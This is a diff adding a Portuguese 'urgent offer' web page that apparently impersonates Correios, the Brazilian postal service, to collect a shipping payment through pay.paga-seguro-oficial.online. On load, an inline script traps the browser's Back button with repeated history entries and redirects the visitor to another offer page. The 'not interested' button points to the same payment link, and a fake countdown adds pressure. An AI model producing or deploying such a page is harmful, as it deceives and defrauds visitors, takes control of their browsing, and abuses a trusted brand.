@@ -1,0 +1,85 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oferta Urgente</title>
+    <link rel="stylesheet" href="css/styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Antonio:wght@700&amp;family=Poppins:wght@400&amp;display=swap" rel="stylesheet">
+    <script>
+        const link = '../back2/';
+
+        function setBackRedirect(url) {
+            let urlBackRedirect = url.trim() + (url.indexOf('?') > 0 ? '&' : '?') + document.location.search.replace('?', '').toString();
+            history.pushState(null, null, location.href);
+            history.pushState(null, null, location.href);
+            history.pushState(null, null, location.href);
+
+            window.addEventListener('popstate', () => {
+                console.log('onpopstate', urlBackRedirect);
+                setTimeout(() => {
+                    location.href = urlBackRedirect;
+                }, 1);
+            });
+        }
+        setBackRedirect(link);
+
+        function handleNoInterest() {
+            document.querySelector('.original-price').innerText = 'R$89,90';
+            document.querySelector('.discounted-price').innerText = 'R$67,00';
+            const noInterestBtn = document.querySelector('.no-interest-btn');
+            noInterestBtn.innerText = 'NÃO TENHO INTERESSE';
+            noInterestBtn.href = '../back2/';
+        }
+    </script>
+    <script src="js/latest.js" async="" defer=""></script>
+</head><body>
+    <div class="background">
+        <div class="container">
+            <div class="logo">
+                <img src="images/logo.png" alt="Logo Correios">
+            </div>
+            <div id="somente-agora" class="urgent">
+                SOMENTE AGORA
+            </div>
+            <div class="offer">
+                Pague apenas o <span class="original-price"></span>  <span class="discounted-price">FRETE</span> <span class="shipping">🚚</span>
+            </div>
+            <div class="countdown-card">
+                CONTAGEM REGRESSIVA
+                <div id="timer">10:00</div>
+            </div>
+            <div class="button">
+                <a class="elementor-button elementor-button-link elementor-size-sm elementor-animation-shrink" href="https://pay.paga-seguro-oficial.online/VroegNEzvpPGKwj">
+                    GARANTIR AGORA
+                </a>
+            </div>
+            
+            <div style="margin-top: 10px;"></div>
+            
+            <div class="button">
+                <a class="elementor-button elementor-button-link elementor-size-xs elementor-animation-shrink no-interest-btn" href="https://pay.paga-seguro-oficial.online/VroegNEzvpPGKwj" style="background-color: #ff3007; color: white; font-size: 14px; border: 2px solid red;" >
+                    NÃO TENHO INTERESSE
+                </a>
+            </div>
+            <br>
+            <div style="font-family: Poppins; font-weight: bold;" class="cta">
+                Últimos modelos disponíveis!
+            </div>
+        </div>
+    </div>
+    <script src="js/script.js"></script>
+    <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    async
+    defer
+  ></script>
+
+  <script>
+    window.pixelId = "666bb19fef5de14186dcdb6e";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+</body></html>
